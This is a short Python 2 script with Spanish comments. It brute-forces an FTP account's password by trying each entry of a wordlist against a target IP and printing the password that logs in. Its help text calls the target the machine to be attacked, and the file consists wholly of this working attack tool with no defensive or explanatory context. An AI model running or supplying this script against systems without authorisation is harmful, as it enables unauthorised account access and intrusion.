#!/usr/bin/python
__author__ = 'bett0'

import ftplib
from optparse import OptionParser
import traceback

def ftpBrute(user, clave, ip):
    try:
        ftp = ftplib.FTP(ip)
        ftp.login(user, clave)
        print('[+] La clave de {0} es: {1}'.format(user, clave))
        ftp.close()
        return 1
    except Exception, error:
        print('[-] Intentando con {0}'.format(clave))
        return 0

def main():
    try:
        parse = OptionParser(' -i [IP/192.168.1.1] -u [USUARIO] -l [Diccionario] ')
        parse.add_option('-i', '--ip',dest='ip',type='string',help='Es la ip a la maquina que atacara')
        parse.add_option('-u', '--user', dest='user', type='string', help='Nombre del usuario.')
        parse.add_option('-l', '--lista', dest='lista', type='string', help='Lista con las posibles claves')
        (opt, errors) = parse.parse_args()
        if opt.ip != None:
            if opt.user != None:
                if opt.lista != None:
                    with open(opt.lista, 'r') as claves:
                        for clave in claves:
                            try:
                                resp = ftpBrute(opt.user, clave, opt.ip)
                                if resp==1:
                                    break
                            except Exception, err:
                                print('Conectar : {0}'.format(err))
                else:
                    print parse.usage()
            else:
                print parse.usage()
        else:
            print parse.usage()
    except Exception, err:
        print('ErrorMain: {0} \n {1}'.format(str(err), traceback.format_exc()))

if __name__ == '__main__':
    main()